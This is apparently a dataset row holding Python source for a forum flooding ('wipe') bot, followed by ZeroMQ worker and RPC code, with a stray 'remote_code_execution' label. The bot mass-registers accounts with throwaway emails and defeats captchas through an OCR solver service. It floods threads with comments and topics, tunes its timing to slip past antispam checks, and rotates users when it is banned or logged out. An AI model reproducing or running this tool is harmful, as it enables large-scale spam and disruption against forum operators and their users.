    def gen_userdata(self):
        return short_wordsgen()

    def update_caprate(self, got):
        p, g = self._capdata
        p += 1
        if got is True:
            self.counters['captchas'] += 1
            g += 1
        if p >= 255:
            p = p/2
            g = g/2
        self._capdata = (p, g)
        self.caprate = g/p
        self.log.debug('Caprate: pos:%f got:%f rate:%f',
                       p, g, self.caprate)
        if (self.caprate_limit > 0
            and p > self.caprate_minp
            and self.caprate > self.caprate_limit):
            self.on_caprate_limit(self.caprate)
            # if self.getuser() == 'guest':
            #     self.log.info(""lol, we were trying to post from guest"")
            #     while not self.relogin(): self.w.sleep(self.errortimeout)
            # else:
            #     while not self.dologin(): self.w.sleep(self.errortimeout)

    def counter_tick(self):
        if self.counter_report_interval == 0:
            return
        e = self.counter_ticker.elapsed(False)
        if e > self.counter_report_interval:
            self.counter_ticker.tick()
            ccount = self.counters['comments']
            tcount = self.counters['topics']
            if ccount > 0:
                self.log.info('%d comments in %d seconds, %0.2f cps, %0.2f caprate',
                    ccount, e, ccount/e, self.caprate)
                self.counters['comments'] = 0
            if tcount > 0:
                self.log.info('%d topics in %d seconds, %0.2f tps, %0.2f caprate',
                    tcount, e, tcount/e, self.caprate)
                self.counters['topics'] = 0

    def on_caprate_limit(self, rate):
        if not self.logined:
            self._capdata = (0, 0)
            return
        self.log.warn('Caprate %f is over the limit', rate)
        raise Exception('Caprate limit reached')

    def captcha_wrapper(self, inc_fun, fin_fun, *args, **kvargs):
        # TODO: report codes after solving cycle instead of scheduling them.
        try:
            self.log.debug('captcha_wrapper: calling inc_fun %s', repr(inc_fun))
            self.log.error('captcha_wrapper: inc_fun returned %s',
                           repr(inc_fun(*args, **kvargs)))
        except beon.Success as e:
            self.update_caprate(False)
            raise
        except beon.Captcha as e:
            self.log.warn(e)
            _page = e.page
            _catry = e.catry
            # Don't update caprate with positives if not logined
            if self.logined is True:
                try:
                    user = self.find_login(_page)
                except beon.PermanentError:
                    self.log.debug(e)
                else:
                    if user != self.site.ud['login']:
                        self.log.warn('We were posting as %s, but our login is %s',
                                      user, self.site.ud['login'])
                        self.schedule_first(self.relogin)
                        return
            self.update_caprate(True)
            reports = []
            def r():
                if len(reports) > 0:
                    with cstate(self, WipeState.reporting_code):
                        for cid, status in reports:
                            self.report_code(cid, status)
                    reports.clear()
            while self.w.running.is_set():
                _requested_new = False
                try:
                    with cstate(self, WipeState.solving_captcha):
                        cahash, cacode, cid = self.solve_captcha(_page)
                except TempOCRError as e:
                    self.log.error('OCRError: %s, retrying', e)
                    self.w.sleep(self.errortimeout)
                    continue
                except OCRError as e:
                    self.log.error('OCRError: %s, requesting new captcha', e)
                    _requested_new = True
                    cahash, cacode, cid = e.cahash, '', None
                else:
                    self.log.info('code: %s', cacode)
                try:
                    self.log.debug('captcha_wrapper calling fin_fun %s', repr(fin_fun))
                    self.log.error('captcha_wrapper: fin_fun returned %s',
                        repr(fin_fun(cahash, cacode, *args, catry=_catry, **kvargs)))
                    break
                except beon.Success as e:
                    self.counters['captchas_solved'] += 1
                    if cid:
                        reports.append((cid, 'good'))
                    r()
                    raise
                except beon.Captcha as e:
                    _catry = e.catry
                    _page = e.page
                    if _requested_new:
                        self.log.warn('New captcha requested c:%d', _catry)
                        continue
                    self.log.warn('%s c:%d', e, _catry)
                    self.counters['captchas_wrong'] += 1
                    if cid:
                        reports.append((cid, 'bad'))
                    if _catry > self.catrymax:
                        r()
                        raise
                except Exception as e:
                    if cid:
                        reports.append((cid, 'bad'))
                    r()
                    raise

    def adaptive_timeout_wrapper(self, fun, *args, **kvargs):
        try:
            return fun(*args, **kvargs)
        except beon.Antispam as e:
            self.log.info('Antispam exc caught, successtimeout + 0.1, cur: %f',
                          self.successtimeout)
            self.successtimeout = self.successtimeout + 0.1
            raise

    def register_new_user(self):
        with cstate(self, WipeState.registering):
            _regcount = 0
            while self.w.running.is_set():
                self.w.p.poll(0)
                ud = self.gen_userdata()
                self.request_email(ud)
                for c in self.hooks['pre_register_new_user']:
                    c(self, ud)
                self.log.info('Generated new userdata: %s, registering', ud['login'])
                self.log.debug('Userdata: %s', repr(ud))
                try:
                    udc = ud.copy()
                    if 0 in udc:
                        del udc[0]
                    self.register(**udc)
                except beon.Success as e:
                    self.validate_email(ud)
                    for c in self.hooks['post_register_new_user']:
                        c(self, ud)
                    return ud
                except (beon.EmptyAnswer, beon.Wait5Min) as e:
                    self.log.error('%s, sleeping for 100 seconds', e)
                    self.long_sleep(100)
                except beon.Captcha as e:
                    self.log.error('Too much wrong answers to CAPTCHA')
                    continue
                except beon.UnknownAnswer as e:
                    _regcount += 1
                    if not _regcount < self.reglimit:
                        raise beon.RegRetryLimit('Cannot register new user')
                    self.log.error('%s, userdata may be invalid, retrying c:%d',
                                e, _regcount)
                    self.w.sleep(self.errortimeout)
            else:
                raise WorkerInterrupt()

    def get_new_user(self):
        ud = self.userqueue.get(True, self.uqtimeout)
        self.userqueue.task_done()
        for c in self.hooks['check_new_user']:
            c(self, ud)
        return ud

    def login(self, login, passwd, **kvargs):
        if not self.site.login_lock.acquire(False):
            with self.site.login_lock.acquire():
                return
        self.logined = False
        try:
            self.captcha_wrapper(self.site.logininc, self.site.loginfin,
                                 login, passwd, **kvargs)
        except beon.Success as e:
            self.logined = True
            self.counters['logged_in'] += 1
            self.log.info(e)
            raise
        finally:
            self.site.login_lock.release()

    def find_login(self, rec):
        try:
            return re.findall(regexp.var_login, rec)[0]
        except IndexError:
            raise beon.PermanentError('No users in here')

    def get_current_login(self):
        return self.find_login(self.site.get_page('1'))

    def dologin(self):
        '''Choose user, do login and return it.'''
        while self.w.running.is_set():
            self.site.ud = None
            try:
                self.site.ud = self.get_new_user()
            except Empty:
                self.log.info('No users in queue')
                self.site.ud = self.register_new_user()
                return
            try:
                with cstate(self, WipeState.logging_in):
                    self.login(self.site.ud['login'], self.site.ud['passwd'])
            except beon.Success as e:
                self.site.postuser = self.site.ud['login']
                self.site.postpass = self.site.ud['passwd']
                self.validate_email(self.site.ud)
                for c in self.hooks['post_login']:
                    c(self, self.site.ud)
                self.w.sleep(self.successtimeout)
                return
            except beon.Captcha as e:
                self.log.error('Too many wrong answers to CAPTCHA')
                self.schedule(self.long_sleep, (10,))
                self.schedule(self.dologin)
            except beon.InvalidLogin as e:
                self.log.error(""Invalid login, passing here"")
                self.schedule(self.dologin)
                self.w.sleep(self.errortimeout)
            except beon.TemporaryError as e:
                self.userqueue.put(self.site.ud)
                self.log.warn(e)
                self.schedule(self.dologin)
                self.w.sleep(self.errortimeout)
        # else:
        #     pending = len(self.pc.sets['pending'])
        #     self.log.warn(""No more logins here, %s pending.""%pending)
        #     if pending == 0: return False

    def relogin(self):
        '''Relogin with current user or do login'''
        if 'login' in self.site.ud:
            while self.w.running.is_set():
                try:
                    with cstate(self, WipeState.logging_in):
                        self.login(self.site.ud['login'], self.site.ud['passwd'])
                except beon.Success as e:
                    for c in self.hooks['post_login']:
                        c(self, self.site.ud)
                    self.w.sleep(self.successtimeout)
                    return
                except beon.InvalidLogin as e:
                    self.log.error(e)
                    self.w.sleep(self.errortimeout)
                    break
                except beon.TemporaryError as e:
                    self.log.warn(e)
                    self.w.sleep(self.errortimeout)
                    continue
        self.dologin()

    def request_email(self, ud):
        ud['email'] = self.mailrequester.gen_addr()
        ud[0]['email_service'] = type(self.mailrequester).__name__
        ud[0]['email_requested'] = False
        ud[0]['email_validated'] = False

    def validate_email(self, ud):
        if ('email' not in ud or
            'email_service' not in ud[0] or
            'email_requested' not in ud[0] or
            'email_validated' not in ud[0] or
            not ud[0]['email_service'] == type(self.mailrequester).__name__
            or ud[0]['email_validated'] is True):
            return
        if not ud[0]['email_requested']:
            try:
                self.site.validate_email_inc()
            except beon.Success as e:
                ud[0]['email_requested'] = True
                self.log.info(e)
        self.log.info('Requesting messages for %s', ud['email'])
        messages = self.mailrequester.get_messages(ud['email'])
        for msg in messages:
            if not msg['mail_from'].find('<reminder@{0}>'.format(self.site.domain)):
                continue
            h = re.findall(regexp.hashinmail.format(self.site.domain),
                msg['mail_html'])
            if len(h) > 0:
                try:
                    self.site.validate_email_fin(h[0])
                except beon.Success as e:
                    ud[0]['email_validated'] = True
                    self.log.info(e)

    def switch_user(self):
        '''Log in with new user, but return the previous one'''
        if 'login' in self.site.ud:
            self.log.info('Switching user %s', self.site.ud['login'])
            self.return_user()
        self.site.ud = self.register_new_user()

    def return_user(self, ud=None):
        if not ud:
            if (hasattr(self.site, 'ud') and self.site.ud):
                ud = self.site.ud
                self.site.ud = None
            else:
                return
        self.log.info('Returning user %s to userqueue', ud['login'])
        self.userqueue.put(ud, False)

    def postmsg(self, target, msg, tuser=None, **kvargs):
        tpair = (tuser, target)
        target = target.lstrip('0')
        try:
            try:
                self.site.ajax_addcomment(target, msg, tuser, **kvargs)
            except beon.Success as e:
                self.update_caprate(False)
                raise
            except beon.Redir as e:
                self.log.warn(e)
                self.log.warn('Using non-ajax addcomment')
                self.captcha_wrapper(self.site.addcomment, self.site.addcommentfin,
                                     target, msg, tuser, **kvargs)
        except beon.Success as e:
            self.counters['comments_added'] += 1
            self.log.debug(e)
            raise
        except beon.Antispam as e:
            self.counters['antispam'] += 1
            self.comment_successtimeout = self.comment_successtimeout + 0.1
            self.log.info('Antispam exc caught, comment_successtimeout + 0.1, cur: %f',
                self.comment_successtimeout)
            raise
        except beon.GuestDeny as e:
            self.counters['delogin'] += 1
            self.log.warn('%s, trying to log in', e)
            self.schedule_first(self.relogin)
            raise
        except beon.Bumplimit as e:
            self.log.info(e)
            self.pc.sets['bumplimit'].add(tpair)
            raise
        except (beon.Closed, beon.UserDeny) as e:
            self.pc.sets['closed'].add(tpair)
            if self.stoponclose:
                self.log.info(e)
                raise beon.PermClosed(""%s:%s is closed"", tpair, e.answer)
            else:
                self.log.info('%s, starting 300s remove timer', e)
                self.pc.add_waiting('closed', tpair, 300)
                raise
        except beon.Wait5Min as e:
            self.counters['wait5mincount'] += 1
            self.log.warn(e)
            raise
        except beon.TemporaryError as e:
            self.log.warn(e)
            raise
        except beon.PermanentError as e:
            self.log.error(e)
            raise

    def addtopic(self, msg, subj, forum='1', tuser=None, **kvargs):
        try:
            self.captcha_wrapper(self.site.addtopicinc, self.site.addtopicfin,
                                 msg, forum, subj, tuser, **kvargs)
        except beon.Success as e:
            self.counters['topics_added'] += 1
            self.log.debug(e)
            raise
        except beon.Wait5Min as e:
            self.counters['wait5min'] += 1
            raise
            # self._bancount += 1
            # if 'login' in self.site.ud:
            #     self.log.warn(e)
            #     self.log.warn('Trying to change user')
            #     self.pc.sets['pending'].add(self.site.ud['login'])
            #     self.pc.add_waiting('pending', self.site.ud['login'], 300)
            #     self.dologin()
            # else:
            #     raise
        except beon.GuestDeny as e:
            if 'login' not in self.site.ud:
                raise
            self.counters['delogin'] += 1
            self.log.warn('%s, trying to log in', e)
            self.schedule_first(self.dologin)
            raise

    def register(self, login, passwd, name, email, **kvargs):
        self.logined = False
        try:
            self.captcha_wrapper(self.site.reginc, self.site.regfin,
                                 login, passwd, name, email, **kvargs)
        except beon.Success as e:
            self.log.info(e)
            self.logined = True
            self.counters['users_registered'] += 1
            raise

    def solve_captcha(self, page):
        # with cstate(self, WipeState.deobfuscating_capage):
        self.log.info('Deobfuscating capage')
        capair = self.w.deobfuscate_capage(self.site.domain, page)
        self.log.info('Answer: %s', repr(capair))
        if len(capair) != 2:
            raise PermOCRError('Invalid answer from Evaluator')
        self.log.info('Downloading captcha image')
        try:
            img = self.http_request(capair[1])
        except sup.net.HTTPError as e:
            # check error code here
            self.log.error(e)
            raise PermOCRError('404 Not Found on caurl', cahash=capair[0])
        self.log.info('Sending captcha image to solver')
        try:
            result, cid = self.w.solve_captcha(img)
        except OCRError as e:
            e.cahash = capair[0]
            raise
        return capair[0], result, cid

    def report_code(self, cid, status):
        self.log.info('Reporting %s code for %s', status, cid)
        self.w.report_code(cid, status)
        self.counters['captcha_codes_reported'] += 1

    def run(self, caller):
        self.w = caller
        self.log = logging.getLogger(self.name)
        self.run_time = Ticker()
        cst = cstate(self, WipeState.starting)
        cst.__enter__()
        self.mailrequester = self.mrc(self.noproxy_rp, self.w.running, self.w.sleep)

        # Get our own logger here, or use worker's?
        self.log.info('Starting')
        self.run_time.tick()

        def drop_user_handler(interface, method, data):
            self.log.info('drop-user signal recieved')
            self.dologin()

        self.w.p.wz.set_sig_handler(b'WipeSkel', b'drop-user', drop_user_handler)

        self.w.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeSkel')
        self.w.p.sig_sock.setsockopt(zmq.SUBSCRIBE, bytes(self.name, 'utf-8'))

        try:
            self._run()
        except Exception as e:
            self.log.exception(e)
        cst.__exit__(None, None, None)
        with cstate(self, WipeState.terminating):
            self.w.p.sig_sock.setsockopt(zmq.UNSUBSCRIBE, b'WipeSkel')
            self.w.p.sig_sock.setsockopt(zmq.UNSUBSCRIBE, bytes(self.name, 'utf-8'))
            self.w.p.wz.del_sig_handler(b'WipeSkel', b'drop-user')
            self.log.info(repr(self.counters))
        self.log.info('Terminating, runtime is %ds', self.run_time.elapsed(False))
/n/n/n",0,remote_code_execution
5,85,42b020edfe6b23b245938d23ff7a0484333d6450,"/evproxy.py/n/n# -*- coding: utf-8 -*-
# -*- mode: python -*-
import wzrpc
from sup.ticker import Ticker

class EvaluatorProxy:
    def __init__(self, ev_init, *args, **kvargs):
        super().__init__()
        self.ev_init = ev_init
        self.bind_kt_ticker = Ticker()
        self.bind_kt = 5

    def handle_evaluate(self, reqid, interface, method, data):
        domain, page = data
        self.p.log.info('Recvd page %s, working on', reqid)
        res = self.ev.solve_capage(domain, page)
        self.p.log.info('Done, sending answer: %s', res)
        self.p.send_success_rep(reqid, [v.encode('utf-8') for v in res])

    def send_keepalive(self):
        msg = self.p.wz.make_req_msg(b'Router', b'bind-keepalive', [],
            self.handle_keepalive_reply)
        msg.insert(0, b'')
        self.p.wz_sock.send_multipart(msg)

    def handle_keepalive_reply(self, reqid, seqnum, status, data):
        if status == wzrpc.status.success:
            self.p.log.debug('Keepalive was successfull')
        elif status == wzrpc.status.e_req_denied:
            self.p.log.warn('Keepalive status {0}, reauthentificating and rebinding'.
                format(wzrpc.name_status(status)))
            self.p.auth_requests()
            self.p.bind_methods()
        elif status == wzrpc.status.e_timeout:
            self.p.log.warn('Keepalive timeout')
        else:
            self.p.log.warn('Keepalive status {0}'.
                format(wzrpc.name_status(status)))

    def __call__(self, parent):
        self.p = parent
        self.p.wz_connect()
        self.p.wz_auth_requests = [
            (b'Router', b'auth-bind-route'),
            (b'Router', b'auth-unbind-route'),
            (b'Router', b'auth-set-route-type')]
        self.p.wz_bind_methods = [
            (b'Evaluator', b'evaluate', self.handle_evaluate, wzrpc.routetype.random)]
        self.p.auth_requests()
        self.p.bind_methods()
        self.ev = self.ev_init()
        self.bind_kt_ticker.tick()
        while self.p.running.is_set():
            socks = self.p.poll()
            if self.bind_kt_ticker.elapsed(False) > self.bind_kt:
                self.bind_kt_ticker.tick()
                self.send_keepalive()
/n/n/n/lib/wzrpc/wzhandler.py/n/n# -*- coding: utf-8 -*-
# -*- mode: python -*-
from . import *
from .wzbase import WZBase

class WZHandler(WZBase):
    def __init__(self):
        self.req_handlers = {}
        self.response_handlers = {}
        self.sig_handlers = {}
        self.iden_reqid_map = BijectiveSetMap()

    def set_req_handler(self, interface, method, fun):
        self.req_handlers[(interface, method)] = fun

    def set_response_handler(self, reqid, fun):
        self.response_handlers[reqid] = fun

    def set_sig_handler(self, interface, method, fun):
        self.sig_handlers[(interface, method)] = fun
    
    def del_req_handler(self, interface, method):
        del self.req_handlers[(interface, method)]

    def del_response_handler(self, reqid):
        del self.response_handlers[reqid]

    def del_sig_handler(self, interface, method):
        del self.sig_handlers[(interface, method)]

    def _parse_req(self, iden, msg, reqid, interface, method):
        try:
            handler = self.req_handlers[(interface, method)]
        except KeyError:
            try:
                handler = self.req_handlers[(interface, None)]
            except KeyError:
                raise WZENoReqHandler(iden, reqid,
                    'No req handler for %s,%s'%(interface, method))
        if iden:
            self.iden_reqid_map.add_value(tuple(iden), reqid)
        handler(reqid, interface, method, msg[1:])
        return ()

    def _parse_rep(self, iden, msg, reqid, seqnum, status):
        try:
            handler = self.response_handlers[reqid]
            if seqnum == 0:
                del self.response_handlers[reqid]
        except KeyError:
            raise WZENoHandler(iden, 'No rep handler for reqid')
        handler(reqid, seqnum, status, msg[1:])
        return ()

    def _parse_sig(self, iden, msg, interface, method):
        try:
            handler = self.sig_handlers[(interface, method)]
        except KeyError:
            raise WZENoHandler(iden, 'No handler for sig %s,%s'%(interface, method))
        handler(interface, method, msg[1:])
        return ()

    def make_req_msg(self, interface, method, args, fun, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        msg = make_req_msg(interface, method, args, reqid)
        self.set_response_handler(reqid, fun)
        return msg
    
    def make_router_req_msg(self, iden, interface, method, args, fun, reqid=None):
        msg = iden[:]
        msg.append(b'')
        msg.extend(self.make_req_msg(interface, method, args, fun, reqid))
        return msg
    
    def make_router_rep_msg(self, reqid, seqnum, status, answer):
        iden = self.iden_reqid_map.get_key(reqid)
        if seqnum == 0:
            self.iden_reqid_map.del_value(iden, reqid)
        msg = list(iden)
        msg.append(b'')
        msg.extend(make_rep_msg(reqid, seqnum, status, answer))
        return msg

    def get_iden(self, reqid):
        return self.iden_reqid_map.get_key(reqid)

    def get_reqids(self, iden):
        return self.iden_reqid_map.get_values(iden)

    def make_reqid(self):
        while True:
            reqid = random.randint(1, (2**64)-1)
            if not reqid in self.response_handlers:
                return reqid
        
    def make_auth_req_data(self, interface, method, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, make_auth_hash(interface, method, reqid, key)]
        return (b'Router', b'auth-request', args, reqid)

    def make_auth_bind_route_data(self, interface, method, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        
        return (b'Router', b'auth-bind-route', args, reqid)

    def make_auth_unbind_route_data(self, interface, method, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        
        return (b'Router', b'auth-unbind-route', args, reqid)

    def make_auth_set_route_type_data(self, interface, method, type_, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, struct.pack('!B', type_),
                make_auth_hash(interface, method, reqid, key)]
        return (b'Router', b'auth-set-route-type', args, reqid)

    def make_auth_clear_data(self, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        return (b'Router', b'auth-clear', [], reqid)

    def req_from_data(self, d, fun):
        return self.make_req_msg(d[0], d[1], d[2], fun, d[3])
  
    def _parse_err(self, iden, msg, status):
        pass

    def _handle_nil(self, iden, msg):
        pass
/n/n/n/lib/wzworkers.py/n/nimport zmq
import threading, multiprocessing
import logging
from sup.ticker import Ticker
# from sup import split_frames
import wzrpc
from wzrpc.wzhandler import WZHandler
import wzauth_data

class WorkerInterrupt(Exception):
    '''Exception to raise when self.running is cleared'''
    def __init__(self):
        super().__init__('Worker was interrupted at runtime')

class Suspend(Exception):
    # if we need this at all.
    '''Exception to raise on suspend signal'''
    def __init__(self, interval, *args, **kvargs):
        self.interval = interval
        super().__init__(*args, **kvargs)

class Resume(Exception):
    '''Exception to raise when suspend sleep is interrupted'''

class WZWorkerBase:
    def __init__(self, wz_addr, fun, args=(), kvargs={},
            name=None, start_timer=None, poll_timeout=None,
            pargs=(), pkvargs={}):
        super().__init__(*pargs, **pkvargs)
        self.name = name if name else type(self).__name__
        self.start_timer = start_timer
        self.poll_timeout = poll_timeout if poll_timeout else 5*1000
        self.call = (fun, args, kvargs)

        self.wz_addr = wz_addr
        self.wz_auth_requests = []
        self.wz_bind_methods = []
        self.wz_poll_timeout = 30

    def __sinit__(self):
        '''Initializes thread-local interface on startup'''
        self.log = logging.getLogger(self.name)
        self.running = threading.Event()
        self.sleep_ticker = Ticker()
        self.poller = zmq.Poller()

        s = self.ctx.socket(zmq.SUB)
        self.poller.register(s, zmq.POLLIN)
        s.setsockopt(zmq.IPV6, True)
        s.connect(self.sig_addr)
        s.setsockopt(zmq.SUBSCRIBE, b'GLOBAL')
        s.setsockopt(zmq.SUBSCRIBE, b'WZWorker')
        s.setsockopt(zmq.SUBSCRIBE, bytes(self.name, 'utf-8'))
        self.sig_sock = s

        s = self.ctx.socket(zmq.DEALER)
        self.poller.register(s, zmq.POLLIN)
        s.setsockopt(zmq.IPV6, True)
        self.wz_sock = s

        self.wz = WZHandler()

        def term_handler(interface, method, data):
            self.log.info(
                'Termination signal %s recieved',
                repr((interface, method, data)))
            self.term()
            raise WorkerInterrupt()
        self.wz.set_sig_handler(b'WZWorker', b'terminate', term_handler)

        def resumehandler(interface, method, data):
            self.log.info('Resume signal %s recieved',
                repr((interface, method, data)))
            raise Resume()

        self.wz.set_sig_handler(b'WZWorker', b'resume', term_handler)
        self.running.set()

    def wz_connect(self):
        self.wz_sock.connect(self.wz_addr)

    def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None):
        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz
        timeout = timeout if timeout else self.wz_poll_timeout
        rs = wzrpc.RequestState(fun)
        msg = self.wz.make_req_msg(interface, method, data,
                                   rs.accept, reqid)
        msg.insert(0, b'')
        s.send_multipart(msg)
        t.tick()
        while self.running.is_set():
            p(timeout*1000)
            if rs.finished:
                if rs.retry:
                    msg = self.wz.make_req_msg(interface, method, data,
                        rs.accept, reqid)
                    msg.insert(0, b'')
                    s.send_multipart(msg)
                    rs.finished = False
                    rs.retry = False
                    continue
                return
            elapsed = t.elapsed(False)
            if elapsed >= timeout:
                t.tick()
                # Notify fun about the timeout
                rs.accept(None, 0, 255, [elapsed])
                # fun sets rs.retry = True if it wants to retry
        raise WorkerInterrupt()
    
    def wz_multiwait(self, requests):
        # TODO: rewrite the retry loop
        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz
        timeout = self.wz_poll_timeout
        rslist = []
        msgdict = {}
        for request in requests:
            rs = wzrpc.RequestState(request[0])
            rslist.append(rs)
            msg = self.wz.make_req_msg(request[1][0], request[1][1], request[1][2],
                                    rs.accept, request[1][3])
            msg.insert(0, b'')
            msgdict[rs] = msg
            s.send_multipart(msg)
        while self.running.is_set():
            flag = 0
            for rs in rslist:
                if rs.finished:
                    if not rs.retry:
                        del msgdict[rs]
                        continue
                    s.send_multipart(msgdict[rs])
                    rs.finished = False
                    rs.retry = False
                flag = 1
            if not flag:
                return
            # check rs before polling, since we don't want to notify finished one
            # about the timeout
            t.tick()
            p(timeout*1000)
            if t.elapsed(False) >= timeout:
                for rs in rslist:
                    if not rs.finished:
                        rs.accept(None, 0, 255, []) # Notify fun about the timeout
                        rs.finished = True # fun sets rs.retry = True if it wants to retry
        raise WorkerInterrupt()

    def auth_requests(self):
        for i, m in self.wz_auth_requests:
            def accept(that, reqid, seqnum, status, data):
                if status == wzrpc.status.success:
                    self.log.debug('Successfull auth for (%s, %s)', i, m)
                elif status == wzrpc.status.e_auth_wrong_hash:
                    raise beon.PermanentError(
                        'Cannot authentificate for ({0}, {1}), {2}: {3}'.\
                        format(i, m, wzrpc.name_status(status), repr(data)))
                elif wzrpc.status.e_timeout:
                    self.log.warn('Timeout {0}, retrying'.format(data[0]))
                    that.retry = True
                else:
                    self.log.warning('Recvd unknown reply for (%s, %s) %s: %s', i, m,
                        wzrpc.name_status(status), repr(data))
            self.wz_wait_reply(accept,
                *self.wz.make_auth_req_data(i, m, wzauth_data.request[i, m]))


    def bind_route(self, i, m, f):
        self.log.debug('Binding %s,%s route', i, m)
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.wz.set_req_handler(i, m, f)
                self.log.debug('Succesfully binded route (%s, %s)', i, m)
            elif status == wzrpc.status.e_req_denied:
                self.log.warn('Status {0}, reauthentificating'.\
                    format(wzrpc.name_status(status)))
                self.auth_requests()
            elif wzrpc.status.e_timeout:
                self.log.warn('Timeout {0}, retrying'.format(data[0]))
                that.retry = True
            else:
                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))
                that.retry = True
        return self.wz_wait_reply(accept,
                *self.wz.make_auth_bind_route_data(i, m, wzauth_data.bind_route[i, m]))

    def set_route_type(self, i, m, t):
        self.log.debug('Setting %s,%s type to %d', i, m, t)
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.log.debug('Succesfully set route type for (%s, %s) to %s', i, m,
                    wzrpc.name_route_type(t))
            elif status == wzrpc.status.e_req_denied:
                self.log.warn('Status {0}, reauthentificating'.\
                    format(wzrpc.name_status(status)))
                self.auth_requests()
            else:
                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))
                that.retry = True
        return self.wz_wait_reply(accept,
            *self.wz.make_auth_set_route_type_data(i, m, t,
                wzauth_data.set_route_type[i, m]))

    def unbind_route(self, i, m):
        if not (i, m) in self.wz.req_handlers:
            self.log.debug('Route %s,%s was not bound', i, m)
            return
        self.log.debug('Unbinding route %s,%s', i, m)
        self.wz.del_req_handler(i, m)
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.log.debug('Route unbinded for (%s, %s)', i, m)
            else:
                self.log.warn('Status %s, passing', wzrpc.name_status(status))
        return self.wz_wait_reply(accept,
            *self.wz.make_auth_unbind_route_data(i, m, wzauth_data.bind_route[i, m]))
    
    def clear_auth(self):
        self.log.debug('Clearing our auth records')
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.log.debug('Auth records on router were cleared')
            else:
                self.log.warn('Status %s, passing', wzrpc.name_status(status))
        return self.wz_wait_reply(accept, *self.wz.make_auth_clear_data())

    def bind_methods(self):
        for i, m, f, t in self.wz_bind_methods:
            self.set_route_type(i, m, t)
            self.bind_route(i, m, f)
    
    def unbind_methods(self):  
        for i, m, f, t in self.wz_bind_methods:
            self.unbind_route(i, m)
        #self.clear_auth()

    def send_rep(self, reqid, seqnum, status, data):
        self.wz_sock.send_multipart(
            self.wz.make_router_rep_msg(reqid, seqnum, status, data))

    def send_success_rep(self, reqid, data):
        self.send_rep(reqid, 0, wzrpc.status.success, data)
    
    def send_error_rep(self, reqid, data):
        self.send_rep(reqid, 0, wzrpc.status.error, data)

    def send_wz_error(self, reqid, data, seqid=0):
        msg = self.wz.make_dealer_rep_msg(
            reqid, seqid, wzrpc.status.error, data)
        self.wz_sock.send_multipart(msg)
        
    def send_to_router(self, msg):
        msg.insert(0, b'')
        self.wz_sock.send_multipart(msg)
    
    # def bind_sig_route(self, routetype, interface, method, fun):
    #     self.log.info('Binding %s,%s as type %d signal route',
    #                   interface, method, routetype)
    #     self.wz.set_signal_handler(interface, method, fun)
    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'bind-sig-route',
    #                                       [interface, method],
    #                                       self.accept_ok)
    #     self.wz_sock.send_multipart(msg)

    # def unbind_sig_route(self, interface, method):
    #     self.log.info('Deleting %s,%s signal route', interface, method)
    #     self.wz.del_signal_handler(interface, method)
    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'unbind-sig-route',
    #                                       [interface, method],
    #                                       self.accept_ok)
    #     self.wz_sock.send_multipart(msg)

    def inter_sleep(self, timeout):
        self.sleep_ticker.tick()
        self.poll(timeout * 1000)
        while self.sleep_ticker.elapsed(False) < timeout:
            try:
                self.poll(timeout * 1000)
            except Resume as e:
                return

    def poll(self, timeout=None):
        try:
            socks = dict(self.poller.poll(timeout if timeout != None
                else self.poll_timeout))
        except zmq.ZMQError as e:
            self.log.error(e)
            return
        if socks.get(self.sig_sock) == zmq.POLLIN:
            # No special handling or same-socket replies are necessary for signals.
            # Backwards socket replies may be added here.
            frames = self.sig_sock.recv_multipart()
            try:
                self.wz.parse_msg(frames[0], frames[1:])
            except wzrpc.WZError as e:
                self.log.warn(e)
        if socks.get(self.wz_sock) == zmq.POLLIN:
            self.process_wz_msg(self.wz_sock.recv_multipart())
        return socks

    def process_wz_msg(self, frames):
        try:
            for nfr in self.wz.parse_router_msg(frames):
                # Send replies from the handler, for cases when it's methods were rewritten.
                self.wz_sock.send_multipart(nfr)
        except wzrpc.WZErrorRep as e:
            self.log.info(e)
            self.wz_sock.send_multipart(e.rep_msg)
        except wzrpc.WZError as e:
            self.log.warn(e)

    def run(self):
        self.__sinit__()
        if self.start_timer:
            self.inter_sleep(self.start_timer)
        if self.running:
            self.log.info('Starting')
            try:
                self.child = self.call[0](*self.call[1], **self.call[2])
                self.child(self)
            except WorkerInterrupt as e:
                self.log.warn(e)
            except Exception as e:
                self.log.exception(e)
            self.log.info('Terminating')
        else:
            self.log.info('Aborted')
        self.running.set() # wz_multiwait needs this to avoid another state check.
        self.unbind_methods()
        self.running.clear()
        self.wz_sock.close()
        self.sig_sock.close()
    
    def term(self):
        self.running.clear()


class WZWorkerThread(WZWorkerBase, threading.Thread):
    def start(self, ctx, sig_addr, *args, **kvargs):
        self.ctx = ctx
        self.sig_addr = sig_addr
        threading.Thread.start(self, *args, **kvargs)

class WZWorkerProcess(WZWorkerBase, multiprocessing.Process):
    def start(self, sig_addr, *args, **kvargs):
        self.sig_addr = sig_addr
        multiprocessing.Process.start(self, *args, **kvargs)
    
    def __sinit__(self):
        self.ctx = zmq.Context()
        super().__sinit__()
/n/n/n/unistart.py/n/n#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- mode: python -*-
import sys
if 'lib' not in sys.path:
    sys.path.append('lib')
import os, signal, logging, threading, re, traceback, time
import random
import zmq
from queue import Queue
import sup
import wzworkers as workers
from dataloader import DataLoader
from uniwipe import UniWipe
from wipeskel import *
import wzrpc
from beon import regexp
import pickle

from logging import config
from logconfig import logging_config
